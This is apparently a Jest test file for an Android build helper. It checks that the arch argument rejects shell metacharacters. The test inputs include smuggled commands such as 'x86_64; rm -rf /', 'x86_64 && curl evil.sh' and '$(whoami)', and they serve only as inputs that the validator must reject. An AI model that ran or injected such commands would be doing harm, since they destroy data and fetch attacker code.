import { androidBuild, ARCH_LIST, capitalize } from './build.js';

describe('capitalize', () => {
  it('uppercases the first letter only', () => {
    expect(capitalize('debug')).toBe('Debug');
    expect(capitalize('release')).toBe('Release');
  });
});

describe('androidBuild arch validation', () => {
  it('rejects an arch value containing shell metacharacters before touching gradlew', async () => {
    const result = await androidBuild({ arch: 'x86_64; rm -rf /' });
    expect(result.isError).toBe(true);
    const text = (result.content[0] as { type: 'text'; text: string }).text;
    expect(text).toContain('Invalid arch');
  });

  // Not exercised through androidBuild itself: a valid arch falls through to
  // a real (slow, ~10min-timeout) gradlew invocation, which this sandbox has
  // no Android SDK to complete anyway — test the validation regex directly.
  it('accepts real Android ABI list values', () => {
    expect(ARCH_LIST.test('x86_64')).toBe(true);
    expect(ARCH_LIST.test('arm64-v8a,x86_64')).toBe(true);
    expect(ARCH_LIST.test('armeabi-v7a,arm64-v8a,x86,x86_64')).toBe(true);
  });

  it('rejects shell metacharacters', () => {
    expect(ARCH_LIST.test('x86_64; rm -rf /')).toBe(false);
    expect(ARCH_LIST.test('x86_64 && curl evil.sh')).toBe(false);
    expect(ARCH_LIST.test('$(whoami)')).toBe(false);
  });
});
